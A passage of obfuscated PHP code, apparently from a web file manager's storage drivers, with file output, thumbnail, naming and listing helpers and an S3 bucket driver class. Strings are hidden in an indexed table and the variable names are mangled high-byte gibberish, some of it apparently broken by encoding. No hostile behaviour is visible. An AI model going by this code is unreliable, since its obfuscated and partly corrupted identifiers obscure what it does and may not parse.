$ùîñ„Åé; if ($ùîñ„Åé == $Íá§ƒæ¤) { $Ó—¸ìì = $Š§‡å˜à + 1; } if ($ËäÒ—) { $ÜÁô•ÑŠ = intval(1000 * 1000 * (timeFloat() - $í¥ÌÒ)); $õı×ë = $ËäÒ— - $ÜÁô•ÑŠ; if ($õı×ë > 5) { usleep($õı×ë); } } } } public function fileOutServer($äÏˆ‰®”, $¦“ÔÑüŸ = false, $·–İ‚ÓÏ = false, $€„Éöæ = '') { $this->fileOut($äÏˆ‰®”, $¦“ÔÑüŸ, $·–İ‚ÓÏ, $€„Éöæ); } public function fileOutLink($ØÂ«’) { header($_SERVER[ÏÒ Ì„][159] . $ØÂ«’); die; } public function cacheMethod($«†Ù½ˆÉ, $ÌŒ›Òô, $ñâãÑ‘– = null) { $£“âœÆ… =& $_SERVER[ÏÒ Ì„]; static $ÉıÃÁåí = array(); $‡ˆã…Ì = $ÌŒ›Òô ? ltrim($this->getPathOuter($ÌŒ›Òô), $£“âœÆ…[8]) : $ÌŒ›Òô; $ûÅ‘ï © = $£“âœÆ…[160] . $«†Ù½ˆÉ . $£“âœÆ…[161] . rtrim($‡ˆã…Ì, $£“âœÆ…[8]); if (is_null($«†Ù½ˆÉ)) { $ÉıÃÁåí = array(); return; } if (is_null($ÌŒ›Òô)) { unset($ÉıÃÁåí[$ûÅ‘ï ©]); return; } if (!is_null($ñâãÑ‘–)) { $ÉıÃÁåí[$ûÅ‘ï ©] = $ñâãÑ‘–; return; } $çŞÆ¦ = isset($ÉıÃÁåí[$ûÅ‘ï ©]) ? $ÉıÃÁåí[$ûÅ‘ï ©] : null; if (!is_null($çŞÆ¦)) { return $çŞÆ¦; } $çŞÆ¦ = $this->{$«†Ù½ˆÉ}($ÌŒ›Òô); $ÉıÃÁåí[$ûÅ‘ï ©] = $çŞÆ¦; return $çŞÆ¦; } public function fileOutImage($øìïÏ, $Ûœë“û† = 250) { $£ÛÆÔ =& $_SERVER[ÏÒ Ì„]; set_timeout(); if (substr($øìïÏ, 0, 4) == $£ÛÆÔ[147]) { $this->fileOutLink($øìïÏ); } $¹‰Ğ—‰Ÿ = $this->info($øìïÏ); $ãøÇ‘†Ã = $¹‰Ğ—‰Ÿ[$£ÛÆÔ[28]]; $µŠòêÃÄ = !1; if (isset($GLOBALS[$£ÛÆÔ[162]]) && $GLOBALS[$£ÛÆÔ[162]][$£ÛÆÔ[76]] == $¹‰Ğ—‰Ÿ[$£ÛÆÔ[76]]) { $Ğ»÷é Õ = $GLOBALS[$£ÛÆÔ[162]][$£ÛÆÔ[163]]; if (!$¹‰Ğ—‰Ÿ[$£ÛÆÔ[164]]) { $¹‰Ğ—‰Ÿ[$£ÛÆÔ[164]] = $GLOBALS[$£ÛÆÔ[162]]; } if (isset($Ğ»÷é Õ[$£ÛÆÔ[165]])) { if ($Ğ»÷é Õ[$£ÛÆÔ[165]] <= $Ûœë“û† && $Ğ»÷é Õ[$£ÛÆÔ[166]] <= $Ûœë“û†) { $µŠòêÃÄ = !0; } } $ãøÇ‘†Ã = $¹‰Ğ—‰Ÿ[$£ÛÆÔ[164]][$£ÛÆÔ[28]]; } if ($¹‰Ğ—‰Ÿ[$£ÛÆÔ[78]] <= 1024 * 50 || $µŠòêÃÄ || !function_exists($£ÛÆÔ[167]) || $¹‰Ğ—‰Ÿ[$£ÛÆÔ[168]] == $£ÛÆÔ[169]) { return $this->fileOut($øìïÏ, !1, $ãøÇ‘†Ã); } if (isset($¹‰Ğ—‰Ÿ[$£ÛÆÔ[164]][$£ÛÆÔ[170]])) { $©ã÷»‘Ş = $¹‰Ğ—‰Ÿ[$£ÛÆÔ[164]][$£ÛÆÔ[170]]; } else { if (isset($¹‰Ğ—‰Ÿ[$£ÛÆÔ[164]][$£ÛÆÔ[171]])) { $©ã÷»‘Ş = $¹‰Ğ—‰Ÿ[$£ÛÆÔ[164]][$£ÛÆÔ[171]]; } else { $©ã÷»‘Ş = md5("{$¹‰Ğ—‰Ÿ[$£ÛÆÔ[28]]}\x5f{$¹‰Ğ—‰Ÿ[$£ÛÆÔ[76]]}\137{$¹‰Ğ—‰Ÿ[$£ÛÆÔ[78]]}"); } } $ÀÕÓ™Ú = "{$©ã÷»‘Ş}\137{$Ûœë“û†}\x2e\x70\156\147"; if (!($Í‰Éâ·· = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $£ÛÆÔ[172]))) { $ˆÂÂ«® = IO::mkdir(IO_PATH_SYSTEM_TEMP . $£ÛÆÔ[173]); } else { $ˆÂÂ«® = KodIO::make($Í‰Éâ··); } if ($Í‰Éâ·· = IO::fileNameExist($ˆÂÂ«®, $ÀÕÓ™Ú)) { $Ü¹—€Í = KodIO::make($Í‰Éâ··); return IO::fileOut($Ü¹—€Í, !1, $ãøÇ‘†Ã); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $Ü¹—€Í = DATA_THUMB . $ÀÕÓ™Ú; del_file($Ü¹—€Í); if (!@file_exists($Ü¹—€Í)) { $‡é–ù©Ä = TEMP_FILES; if (!is_dir($‡é–ù©Ä)) { mk_dir($‡é–ù©Ä); } $Ù±ÖÉå = $‡é–ù©Ä . $©ã÷»‘Ş . $£ÛÆÔ[95] . $¹‰Ğ—‰Ÿ[$£ÛÆÔ[168]]; if (!@file_exists($Ù±ÖÉå)) { $Ù±ÖÉå = $this->download($øìïÏ, $Ù±ÖÉå); } ImageThumb::createThumb($Ù±ÖÉå, $Ü¹—€Í, $Ûœë“û†, $Ûœë“û† * 10); } if (!file_exists($Ü¹—€Í) || filesize($Ü¹—€Í) < 100) { return @file_exists($Ù±ÖÉå) ? IO::fileOut($Ù±ÖÉå) : $this->fileOut($øìïÏ); } if (!($Èæ¾Èîœ = IO::move($Ü¹—€Í, $ˆÂÂ«®))) { return IO::fileOut($Ü¹—€Í); } del_file($Ü¹—€Í); IO::fileOut($Èæ¾Èîœ); } public function fileOutImageServer($Ñ°—Â¸ƒ, $¼§ˆóÇº = 250) { $this->fileOutImage($Ñ°—Â¸ƒ, $¼§ˆóÇº); } public function fileNameAuto($ò¿‘¡Å¨, $«Íä¢ÃŸ, $Ä÷øìÓ = REPEAT_RENAME, $“ÇıâÒ = false) { $³œ‘êêü =& $_SERVER[ÏÒ Ì„]; $•¸»Àª = $ò¿‘¡Å¨ === $³œ‘êêü[33] ? $«Íä¢ÃŸ : rtrim($ò¿‘¡Å¨, $³œ‘êêü[8]) . $³œ‘êêü[8] . $«Íä¢ÃŸ; if ($Ä÷øìÓ == REPEAT_REPLACE || !$this->exist($•¸»Àª) || $“ÇıâÒ && $Ä÷øìÓ != REPEAT_RENAME_FOLDER) { return $«Íä¢ÃŸ; } if ($Ä÷øìÓ == REPEAT_SKIP) { return !1; } $â›ã…¸µ = $³œ‘êêü[95] . get_path_ext($«Íä¢ÃŸ); $â›ã…¸µ = $â›ã…¸µ == $³œ‘êêü[95] || $“ÇıâÒ ? $³œ‘êêü[33] : $â›ã…¸µ; $ôÃ½… » = 1; $òßÎµùï = substr($«Íä¢ÃŸ, 0, strlen($«Íä¢ÃŸ) - strlen($â›ã…¸µ)); $ûñ¦Ø¸• = $òßÎµùï . "\50{$ôÃ½… »}\x29{$â›ã…¸µ}"; while ($this->exist(rtrim($ò¿‘¡Å¨, $³œ‘êêü[8]) . $³œ‘êêü[8] . $ûñ¦Ø¸•)) { $ûñ¦Ø¸• = $òßÎµùï . "\x28{$ôÃ½… »}\51{$â›ã…¸µ}"; $ôÃ½… »++; } return $ûñ¦Ø¸•; } private function fileNameAutoList($¬¸¬œë”, $äù©å², $Ö”î´Ù‹ = false) { $ó‹­ßÀ =& $_SERVER[ÏÒ Ì„]; $´Ë„ä™û = $this->listPath($¬¸¬œë”, !0); $´Ë„ä™û = array_merge($´Ë„ä™û[$ó‹­ßÀ[75]], $´Ë„ä™û[$ó‹­ßÀ[74]]); $‹¶¤«ß¼ = array_to_keyvalue($´Ë„ä™û, $ó‹­ßÀ[33], $ó‹­ßÀ[28]); $Ü¢”‹¤Å = $ó‹­ßÀ[95] . get_path_ext($äù©å²); $Ü¢”‹¤Å = $Ü¢”‹¤Å == $ó‹­ßÀ[95] || $Ö”î´Ù‹ ? $ó‹­ßÀ[33] : $Ü¢”‹¤Å; $¿…Å½Ì³ = substr($äù©å², 0, strlen($äù©å²) - strlen($Ü¢”‹¤Å)); $ÍÍ¤ÚÀª = $¿…Å½Ì³ . "\x28\60\51{$Ü¢”‹¤Å}"; for ($½Öìçªë = 1; $½Öìçªë <= count($‹¶¤«ß¼) + 1; $½Öìçªë++) { $ÍÍ¤ÚÀª = $¿…Å½Ì³ . "\x28{$½Öìçªë}\x29{$Ü¢”‹¤Å}"; if (!in_array_not_case($ÍÍ¤ÚÀª, $‹¶¤«ß¼)) { return $ÍÍ¤ÚÀª; } } return $ÍÍ¤ÚÀª; } public function listAllFiles($ĞÒÉÈÓ¨, $­ÜÇ€‚, $Ü…³Š™ = array()) { $Ï›õÎÍñ =& $_SERVER[ÏÒ Ì„]; if (empty($­ÜÇ€‚)) { return array(); } $ä”×²¢œ = array(); $ĞÒÉÈÓ¨ = trim($ĞÒÉÈÓ¨, $Ï›õÎÍñ[8]); foreach ($­ÜÇ€‚ as $±–¹¤†) { $í¶ˆ³µœ = ltrim(substr(trim($±–¹¤†, $Ï›õÎÍñ[8]), strlen($ĞÒÉÈÓ¨)), $Ï›õÎÍñ[8]); $ä”×²¢œ = array_merge($ä”×²¢œ, $this->slicePath($í¶ˆ³µœ)); } $‘Ú âÚå = array(); foreach (array_unique($ä”×²¢œ) as $±–¹¤†) { $Ô„Ëôù× = array($Ï›õÎÍñ[76] => $this->getPathOuter($Ï›õÎÍñ[8] . $ĞÒÉÈÓ¨ . $Ï›õÎÍñ[8] . $±–¹¤†), $Ï›õÎÍñ[77] => 1, $Ï›õÎÍñ[78] => 0); if (substr($±–¹¤†, -1) != $Ï›õÎÍñ[8]) { $Ô„Ëôù×[$Ï›õÎÍñ[77]] = 0; $Æ±ùôµ = $this->getPath($ĞÒÉÈÓ¨ . $Ï›õÎÍñ[8] . $±–¹¤†); $Ô„Ëôù×[$Ï›õÎÍñ[78]] = isset($Ü…³Š™[$Æ±ùôµ]) ? $Ü…³Š™[$Æ±ùôµ] : $this->size($Æ±ùôµ); } $‘Ú âÚå[] = $Ô„Ëôù×; } return $‘Ú âÚå; } public function slicePath($šëÄú‡È) { $ö¹ĞÙ„Ô =& $_SERVER[ÏÒ Ì„]; $Â–¤ÔÒÍ = explode($ö¹ĞÙ„Ô[8], trim($šëÄú‡È, $ö¹ĞÙ„Ô[8])); $¦ÌäĞÄ” = 0; do { ++$¦ÌäĞÄ”; $öÀÙ¨ŸÀ[] = implode($ö¹ĞÙ„Ô[8], array_slice($Â–¤ÔÒÍ, 0, $¦ÌäĞÄ”)) . $ö¹ĞÙ„Ô[8]; } while ($¦ÌäĞÄ” < count($Â–¤ÔÒÍ)); $öÀÙ¨ŸÀ[count($Â–¤ÔÒÍ) - 1] = $šëÄú‡È; return $öÀÙ¨ŸÀ; } public function getHost() { $’õöÒç =& $_SERVER[ÏÒ Ì„]; $×´®ÒÌ = parse_url(trim($this->domain, $’õöÒç[8])); $ïÂê‹ó© = isset($×´®ÒÌ[$’õöÒç[174]]) ? $×´®ÒÌ[$’õöÒç[174]] : http_type(); $ãŠŞŒüˆ = isset($×´®ÒÌ[$’õöÒç[175]]) ? $×´®ÒÌ[$’õöÒç[175]] : $×´®ÒÌ[$’õöÒç[76]]; if (isset($×´®ÒÌ[$’õöÒç[176]])) { $ãŠŞŒüˆ .= $’õöÒç[4] . $×´®ÒÌ[$’õöÒç[176]]; } return $ïÂê‹ó© . $’õöÒç[177] . $ãŠŞŒüˆ; } public function pathEncode($—Å’ËÅ) { $†ê£æ»Á =& $_SERVER[ÏÒ Ì„]; return str_replace($†ê£æ»Á[178], $†ê£æ»Á[8], rawurlencode($—Å’ËÅ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($…ûïªÍÓ) { set_timeout(); require_once SDK_DIR . $_SERVER[ÏÒ Ì„][179]; parent::__construct(); $this->_init($…ûïªÍÓ); } public function _init($şáè‚Ë») { foreach ($şáè‚Ë» as $ò¾ÁÆ Œ => $Íµ¬Î¢) { if (isset($this->{$ò¾ÁÆ Œ})) { $this->{$ò¾ÁÆ Œ} = $Íµ¬Î¢; } } $this->endpoint = $şáè‚Ë»[$_SERVER[ÏÒ Ì„][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($†¤æî—³ = "\166\x34") { $this->signVer = $†¤æî—³; $this->client->setSignatureVersion($†¤æî—³); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $åÕÍ¥‹® =& $_SERVER[ÏÒ Ì„]; $Â¦ü÷«… = $this->getBucketCors(); if (!$Â¦ü÷«… || !is_array($Â¦ü÷«…)) { return !1; } if ($Â¦ü÷«…[$åÕÍ¥‹®[181]] != $åÕÍ¥‹®[182] || $Â¦ü÷«…[$åÕÍ¥‹®[183]] != $åÕÍ¥‹®[182]) { return !1; } $ò•ÚÍÜ = array_map($åÕÍ¥‹®[184], $Â¦ü÷«…[$åÕÍ¥‹®[185]]); if (!is_array($ò•ÚÍÜ)) { $ò•ÚÍÜ = array(); } $™¢­ü·ï = array($åÕÍ¥‹®[186], $åÕÍ¥‹®[187], $åÕÍ¥‹®[188], $åÕÍ¥‹®[189], $åÕÍ¥‹®[190]); $“Ñßë´¥ = array_diff($™¢­ü·ï, $ò•ÚÍÜ); return empty($“Ñßë´¥); } public function mkfile($øå…ñÑû, $·¾ÕøŠÈ = '', $á‰ÅÑá¢ = REPEAT_RENAME) { $¹®÷æÏ¿ = $this->setContent($øå…ñÑû, $·¾ÕøŠÈ); if ($¹®÷æÏ¿ !== !1) { return $this->getPathOuter($øå…ñÑû); } return !1; } public function mkdir($ä‚»¨, $¥»ŸŸÒä = REPEAT_SKIP) { $¿„˜ˆÙ’ =& $_SERVER[ÏÒ Ì„]; if (empty($ä‚»¨) && $ä‚»¨ !== $¿„˜ˆÙ’[191]) { return !1; } if ($this->_isFolder($ä‚»¨)) { return $this->getPathOuter($ä‚»¨); } $›ñÄËæ† = $this->setContent($ä‚»¨, $¿„˜ˆÙ’[33], !0); if ($›ñÄËæ† !== !1) { return $this->getPathOuter($ä‚»¨); } return !1; } public function copyFile($ßŠôşâ¸, $ñ§Şİ«, $Ë¹•Ù­ª = array()) { $¨œóÓÔ =& $_SERVER[ÏÒ Ì„]; $¦ÀÖ©¨¿ = $this->objectMeta($ßŠôşâ¸); if (!$¦ÀÖ©¨¿) { return !1; } if ($¦ÀÖ©¨¿[$¨œóÓÔ[78]] <= 1024 * 1024 * 200) { $ô¤³¦ÀÀ = $this->client->copyObject($this->bucket, $ßŠôşâ¸, $this->bucket, $ñ§Şİ«, $¨œóÓÔ[192], $Ë¹•Ù­ª); } else { $ô¤³¦ÀÀ = $this->client->multiCopyObject($this->bucket, $ßŠôşâ¸, $this->bucket, $ñ§Şİ«, $Ë¹•Ù­ª); } $ô¤³¦ÀÀ = $ô¤³¦ÀÀ ? $this->getPathOuter($ñ§Şİ«) : !1; return $ô¤³¦ÀÀ; } public function moveFile($ääŸ£È¤, $Ï¹Ÿê¶Ô) { if ($this->copyFile($ääŸ£È¤, $Ï¹Ÿê¶Ô)) { $this->delFile($ääŸ£È¤); return $this->getPathOuter($Ï¹Ÿê¶Ô); } return !1; } public function delFile($Û†Õ®¡ş) { return $this->client->deleteObject($this->bucket, $Û†Õ®¡ş); } public function delFolder($Æã‰²Ğç) { $¹¡¶Êî =& $_SERVER[ÏÒ Ì„]; if (!$this->exist($Æã‰²Ğç)) { return !0; } $this->listItemCache = !1; $‘üéüùó = $this->fileList($Æã‰²Ğç); $this->listItemCache = !0; $¢”¶ï§Ğ = trim($Æã‰²Ğç, $¹¡¶Êî[8]) . $¹¡¶Êî[8]; if (!empty($Æã‰²Ğç) && $Æã‰²Ğç !== $¹¡¶Êî[191] && !in_array($¢”¶ï§Ğ, $‘üéüùó[$¹¡¶Êî[75]])) { $‘üéüùó[$¹¡¶Êî[75]][] = $¢”¶ï§Ğ; } $³æïÎÇÈ = $this->delByBatch($‘üéüùó[$¹¡¶Êî[74]]); if (!$³æïÎÇÈ) { return !1; } $³æïÎÇÈ = $this->delByBatch($‘üéüùó[$¹¡¶Êî[75]]); if (!$³æïÎÇÈ) { return !1; } return $this->delFile($¢”¶ï§Ğ); } private function delByBatch($Õ¾®×í·) { foreach (array_chunk($Õ¾®×í·, 1000) as $Şæƒ¤µ¬) { $§Áãã¨é = $this->client->deleteObjects($this->bucket, $Şæƒ¤µ¬); if (!$§Áãã¨é) { return !1; } } return !0; } public function rename($·’ñşûÓ, $ùç–Ä½) { return $this->renameObject($·’ñşûÓ, $ùç–Ä½); } public function listPath($ÅšÅíÈÃ, $•Û°ˆØ¼ = false) { $ÁÔÜ‹Ï =& $_SERVER[ÏÒ Ì„]; $ÛÊµ¿Áô = $this->fileList($ÅšÅíÈÃ, $ÁÔÜ‹Ï[8], !0); foreach ($ÛÊµ¿Áô[$ÁÔÜ‹Ï[75]] as $…†Ë¸½¹ => $¹ó¾ıíæ) { $ÛÊµ¿Áô[$ÁÔÜ‹Ï[75]][$…†Ë¸½¹] = $this->folderInfo($¹ó¾ıíæ, $•Û°ˆØ¼); } foreach ($ÛÊµ¿Áô[$ÁÔÜ‹Ï[74]] as $…†Ë¸½¹ => $¹ó¾ıíæ) { $ÛÊµ¿Áô[$ÁÔÜ‹Ï[74]][$…†Ë¸½¹] = $this->fileInfo($¹ó¾ıíæ[$ÁÔÜ‹Ï[28]], $•Û°ˆØ¼, $¹ó¾ıíæ); } return $ÛÊµ¿Áô; } private function fileInfo($Ëç²Ö•, $”¯şØ¨š = false, $¤¿ˆá„¨ = array()) { $¤ı›“Êš =& $_SERVER[ÏÒ Ì„]; $§İù‡È = array($¤ı›“Êš[28] => $this->pathThis($Ëç²Ö•), $¤ı›“Êš[76] => $this->getPathOuter($Ëç²Ö•), $¤ı›“Êš[29] => $¤ı›“Êš[193], $¤ı›“Êš[168] => $this->ext($Ëç²Ö•), $¤ı›“Êš[78] => isset($¤¿ˆá„¨[$¤ı›“Êš[78]]) ? $¤¿ˆá„¨[$¤ı›“Êš[78]] : 0); if ($”¯şØ¨š) { return $§İù‡È; } $§İù‡È[$¤ı›“Êš[194]] = $§İù‡È[$¤ı›“Êš[84]] = 0; $§İù‡È[$¤ı›“Êš[195]] = $§İù‡È[$¤ı›“Êš[196]] = !0; if (empty($¤¿ˆá„¨)) { $¤¿ˆá„¨ = $this->objectMeta($Ëç²Ö•); if (!$¤¿ˆá„¨) { return $§İù‡È; } } if (isset($¤¿ˆá„¨[$¤ı›“Êš[197]])) { $§İù‡È[$¤ı›“Êš[84]] = $¤¿ˆá„¨[$¤ı›“Êš[197]]; } if (isset($¤¿ˆá„¨[$¤ı›“Êš[78]])) { $§İù‡È[$¤ı›“Êš[78]] = $¤¿ˆá„¨[$¤ı›“Êš[78]]; } return $§İù‡È; } private function folderInfo($ƒªı£µ×, $¡Ö¿Šúİ = false) { $§“ÀåˆÁ =& $_SERVER[ÏÒ Ì„]; $Î¹›ôÚô = array($§“ÀåˆÁ[28] => $this->pathThis($ƒªı£µ×), $§“ÀåˆÁ[76] => $this->getPathOuter($§“ÀåˆÁ[8] . $ƒªı£µ×), $§“ÀåˆÁ[29] => $§“ÀåˆÁ[77]); if ($¡Ö¿Šúİ) { return $Î¹›ôÚô; } $Î¹›ôÚô[$§“ÀåˆÁ[194]] = $Î¹›ôÚô[$§“ÀåˆÁ[84]] = 0; $Î¹›ôÚô[$§“ÀåˆÁ[195]] = $Î¹›ôÚô[$§“ÀåˆÁ[196]] = !0; if ($ƒªı£µ× == $§“ÀåˆÁ[33]) { return $Î¹›ôÚô; } $ƒªı£µ× = trim($ƒªı£µ×, $§“ÀåˆÁ[8]) . $§“ÀåˆÁ[8]; $Õş§ÒÊŞ = $this->objectMeta($ƒªı£µ×); if (isset($Õş§ÒÊŞ[$§“ÀåˆÁ[197]])) { $Î¹›ôÚô[$§“ÀåˆÁ[194]] = $Õş§ÒÊŞ[$§“ÀåˆÁ[197]]; } return $Î¹›ôÚô; } private function fileList($ßÂ™Ä¶±, $èšô€¢Ø = '', $¶˜™õ°å = 0) { $ ÒÔ§À =& $_SERVER[ÏÒ Ì„]; $â³ˆÂÍğ = rtrim($ßÂ™Ä¶±, $ ÒÔ§À[8]) . $ ÒÔ§À[8]; $¹Åå‹øœ = $this->listObjs($â³ˆÂÍğ, null, null, $èšô€¢Ø); if (!$¹Åå‹øœ) { return array($ ÒÔ§À[75] => array(), $ ÒÔ§À[74] => array()); } $ú§øŒÂ = $this->listItemCache === !1 ? !1 : !0; $ş´†– = $†Õà­±£ = array(); foreach ($¹Åå‹øœ[$ ÒÔ§À[198]] as $†ÎåÂÑ€) { $Äà‘“ò = $†ÎåÂÑ€[$ ÒÔ§À[28]]; if ($Äà‘“ò == $â³ˆÂÍğ) { continue; } $å­àèÙ‹ = isset($†ÎåÂÑ€[$ ÒÔ§À[78]]) ? $†ÎåÂÑ€[$ ÒÔ§À[78]] : 0; $š‘áÆÖ¬ = $å­àèÙ‹ == 0 && substr($Äà‘“ò, strlen($Äà‘“ò) - 1, 1) == $ ÒÔ§À[8] ? !0 : !1; if ($ú§øŒÂ) { $this->cacheMethod($ ÒÔ§À[199], $Äà‘“ò, $š‘áÆÖ¬); $this->cacheMethod($ ÒÔ§À[200], $Äà‘“ò, $†ÎåÂÑ€); } if ($š‘áÆÖ¬) { $ş´†–[] = $Äà‘“ò; continue; } $†Õà­±£[] = $¶˜™õ°å ? $†ÎåÂÑ€ : $Äà‘“ò; } foreach ($¹Åå‹øœ[$ ÒÔ§À[201]] as $†ÎåÂÑ€) { $ş´†–[] = $†ÎåÂÑ€[$ ÒÔ§À[28]]; if ($ú§øŒÂ) { $this->cacheMethod($ ÒÔ§À[199], $†ÎåÂÑ€[$ ÒÔ§À[28]], !0); } } if ($ú§øŒÂ) { $this->cacheMethod($ ÒÔ§À[199], $ßÂ™Ä¶±, !0); } return array($ ÒÔ§À[75] => $ş´†–, $ ÒÔ§À[74] => $†Õà­±£); } private function listObjs($’–€·ä¦, $Óİœ§Â° = null, $¤áí™Îª = null, $ƒ±ƒæ€ = null) { $üÜĞœ®Û =& $_SERVER[ÏÒ Ì„]; $’–€·ä¦ = trim($’–€·ä¦, $üÜĞœ®Û[8]); $–É¤×”£ = empty($’–€·ä¦) && $’–€·ä¦ !== $üÜĞœ®Û[191] ? $üÜĞœ®Û[33] : $’–€·ä¦ . $üÜĞœ®Û[8]; return $this->client->getBucket($this->bucket, $–É¤×”£, $Óİœ§Â°, $¤áí™Îª, $ƒ±ƒæ€, !0); } public function has($Á“ŒâîÏ, $¢ºËßóÈ = false, $Ë¢ÖãÓ¡ = true) { $Òêµ¡Ÿ =& $_SERVER[ÏÒ Ì„]; $Á“ŒâîÏ = trim($Á“ŒâîÏ, $Òêµ¡Ÿ[8]); $»’¬Ï¡¤ = empty($Á“ŒâîÏ) && $Á“ŒâîÏ !== $Òêµ¡Ÿ[191] ? $Òêµ¡Ÿ[33] : $Á“ŒâîÏ . $Òêµ¡Ÿ[8]; $—¸ĞªŠÊ = null; $§‰…¿âØ = 500; $±Óƒ›Ü– = $Òêµ¡Ÿ[8]; $¯İÒÍ‰ì = $ô‘ş¾» = array(); while (!0) { $´±õÑ÷ = $this->listObjs($Á“ŒâîÏ, $—¸ĞªŠÊ, $§‰…¿âØ, $±Óƒ›Ü–); if (!$´±õÑ÷) { break; } $—¸ĞªŠÊ = $´±õÑ÷[$Òêµ¡Ÿ[202]]; $•˜ö¯¿İ = $´±õÑ÷[$Òêµ¡Ÿ[198]]; $Î¼òŸ½Ò = $´±õÑ÷[$Òêµ¡Ÿ[201]]; if (empty($•˜ö¯¿İ) && empty($Î¼òŸ½Ò)) { break; } if (count($•˜ö¯¿İ) == 1 && $•˜ö¯¿İ[0][$Òêµ¡Ÿ[28]] == $»’¬Ï¡¤) { break; } if ($¢ºËßóÈ) { if (count($•˜ö¯¿İ)) { $•˜ö¯¿İ = array_column($•˜ö¯¿İ, $Òêµ¡Ÿ[28]); $¯İÒÍ‰ì = array_merge($¯İÒÍ‰ì, $•˜ö¯¿İ); } if (count($Î¼òŸ½Ò)) { $Î¼òŸ½Ò = array_column($Î¼òŸ½Ò, $Òêµ¡Ÿ[28]); $ô‘ş¾» = array_merge($ô‘ş¾», $Î¼òŸ½Ò); } if ($—¸ĞªŠÊ === null) { break; } continue; } if ($Ë¢ÖãÓ¡) { if (!empty($•˜ö¯¿İ)) { if (count($•˜ö¯¿İ) > 1 || isset($•˜ö¯¿İ[0][$Òêµ¡Ÿ[28]]) && $•˜ö¯¿İ[0][$Òêµ¡Ÿ[28]] != $»’¬Ï¡¤) { return !0; } } } else { if (!empty($Î¼òŸ½Ò)) { return !0; } } if ($—¸ĞªŠÊ === null) { break; } } if ($¢ºËßóÈ) { $¯İÒÍ‰ì = array_diff($¯İÒÍ‰ì, array($»’¬Ï¡¤)); $¯İÒÍ‰ì = count(array_unique($¯İÒÍ‰ì)); $ô‘ş¾» = count(array_unique($ô‘ş¾»)); return array($Òêµ¡Ÿ[203] => $¯İÒÍ‰ì, $Òêµ¡Ÿ[204] => $ô‘ş¾»); } return !1; } public function listAll($õ‘€Öïö) { $ÑÓÌç¤® =& $_SERVER[ÏÒ Ì„]; $“‰ÛÌ¸„ = $this->fileList($õ‘€Öïö, $ÑÓÌç¤®[33], !0); $¹“¹Ù›à = array(); foreach ($“‰ÛÌ¸„[$ÑÓÌç¤®[74]] as $Í¦¾¾Ê) { $¹“¹Ù›à[$Í¦¾¾Ê[$ÑÓÌç¤®[28]]] = $Í¦¾¾Ê[$ÑÓÌç¤®[78]]; } foreach ($“‰ÛÌ¸„[$ÑÓÌç¤®[75]] as $Í¦¾¾Ê) { if (is_string($Í¦¾¾Ê)) { $¹“¹Ù›à[$Í¦¾¾Ê] = 0; } } return $this->listAllFiles($õ‘€Öïö, array_keys($¹“¹Ù›à), $¹“¹Ù›à); } public function canRead($Ì¥ˆÏô) { $ÈÌ«‰è» =& $_SERVER[ÏÒ Ì„]; $òÈ–ëà° = $this->client->getAccessControlPolicy($this->bucket, $Ì¥ˆÏô); if (!$òÈ–ëà°) { return !1; } return in_array($òÈ–ëà°, array($ÈÌ«‰è»[205], $ÈÌ«‰è»[206], $ÈÌ«‰è»[207])) ? !0 : !1; } public function canWrite($•èİÂ¸) { $Š›€òñ‚ =& $_SERVER[ÏÒ Ì„]; $‰©ÓæËã = $this->client->getAccessControlPolicy($this->bucket, $•èİÂ¸); if (!$‰©ÓæËã) { return !1; } return in_array($‰©ÓæËã, array($Š›€òñ‚[205], $Š›€òñ‚[206])) ? !0 : !1; } public function getContent($éÔ‡ù‰) { return $this->client->getObject($this->bucket, $éÔ‡ù‰); } public function setContent($šÜ§šµ”, $¡ÍÎÜû— = '', $„•¦©¬Ø = false) { $âÀğæú† =& $_SERVER[ÏÒ Ì„]; $šÜ§šµ” = $„•¦©¬Ø ? trim($šÜ§šµ”, $âÀğæú†[8]) . $âÀğæú†[8] : $šÜ§šµ”; $ÚÀ¶ÑÁ = get_file_mime(get_path_ext($šÜ§šµ”)); $† ÏÌ˜ = $this->client->putObject($¡ÍÎÜû—, $this->bucket, $šÜ§šµ”, $âÀğæú†[192], array(), $ÚÀ¶ÑÁ); if (!$† ÏÌ˜) { return !1; } if ($„•¦©¬Ø) { return !0; } $this->cacheMethod(null, null); $† ÏÌ˜ = $this->copyFile($šÜ§šµ”, $šÜ§šµ”, array($âÀğæú†[208] => $† ÏÌ˜[$âÀğæú†[209]])); return $† ÏÌ˜ ? !0 : !1; } public function fileSubstr($ò–âè, $•Ó®ƒ€ğ, $·÷á†«ä) { $ÛÒ²ë¼À = $•Ó®ƒ€ğ + $·÷á†«ä - 1; return $this->client->getObject($this->bucket, $ò–âè, array($_SERVER[ÏÒ Ì„][210] => "\142\171\x74\x65\163\x3d{$•Ó®ƒ€ğ}\55{$ÛÒ²ë¼À}")); } public function upload($æáš¢«â, $Ø¾ıñîÙ, $…Ï¬Ùşí = false, $¬º¢‰ÜÍ = REPEAT_REPLACE) { $úèìöÖˆ =& $_SERVER[ÏÒ Ì„]; $ÕÊãŠÎ = array($úèìöÖˆ[208] => @md5_file($Ø¾ıñîÙ)); $Ş´÷ñĞ = array($úèìöÖˆ[211] => get_file_mime(get_path_ext($æáš¢«â))); if (IO::size($Ø¾ıñîÙ) <= 1024 * 1024 * 200) { $Å¼Âú‰Ï = $this->client->putObjectFile($Ø¾ıñîÙ, $this->bucket, $æáš¢«â, $úèìöÖˆ[192], $ÕÊãŠÎ, $Ş´÷ñĞ); return !empty($Å¼Âú‰Ï) ? $this->getPathOuter($æáš¢«â) : !1; } $ß©°§®â = $this->client->multiUploadObject($Ø¾ıñîÙ, $this->bucket, trim($æáš¢«â, $úèìöÖˆ[8]), $ÕÊãŠÎ, $Ş´÷ñĞ); return $ß©°§®â ? $this->getPathOuter($æáš¢«â) : !1; } public function download($ØƒÉÁûµ, $ğéßšÜ) { if (!@is_dir($this->pathFather($ğéßšÜ)) && !IO::mkdir($this->pathFather($ğéßšÜ))) { return !1; 